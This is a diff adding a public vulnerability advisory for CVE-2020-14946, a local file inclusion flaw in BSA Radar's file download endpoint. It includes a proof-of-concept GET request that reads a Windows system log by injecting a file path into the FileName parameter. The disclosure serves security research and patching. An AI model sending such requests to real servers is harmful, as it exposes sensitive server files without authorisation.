@@ -1,0 +1,34 @@
+# Exploit title: BSA Radar 1.6.7234.24750 - Local File Inclusion
+# Date: 2020-07-08
+# Exploit Author: William Summerhill
+# Vendor homepage: https://www.globalradar.com/
+# Version: BSA Radar - Version 1.6.7234.24750 and lower
+# CVE-2020-14946 - Local File Inclusion
+
+# Description: The Administrator section of the Surveillance module in Global RADAR - BSA Radar 1.6.7234.X 
+# and lower allows users to download transaction files. When downloading the files, 
+# a user is able to view local files on the web server by manipulating the FileName 
+# and FilePath parameters in the URL, or while using a proxy. This vulnerability could 
+# be used to view local sensitive files or configuration files on the backend server.
+
+	Vulnerable endpoint: /UC/downloadFile.ashx
+
+	The current user is required to have valid privileges to send requests to the target vulnerable endpoint.
+
+Proof of Concept:
+
+	HTTP Request PoC:
+
+		VALID REQUEST:
+		GET /UC/downloadFile.ashx?ID=XXXX&FileName=SOMEFILE.TXT&UploadStyle=1&UploadStyle=1&UploadSource=6
+
+		LFI EXPLOIT REQUEST:
+		GET /UC/downloadFile.ashx?ID=XXXX&FileName=C:\Windows\debug\NetSetup.log&UploadStyle=1&UploadSource=6
+
+	The entire LFI path can be injected into the "FileName" parameter in order to enumerate existing files on the server. Other LFI files can be tested (such as the Windows hosts file) for further verification and disclosures.
+
+Tested on: Windows
+
+CVE: CVE-2020-14946
+
+Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14946
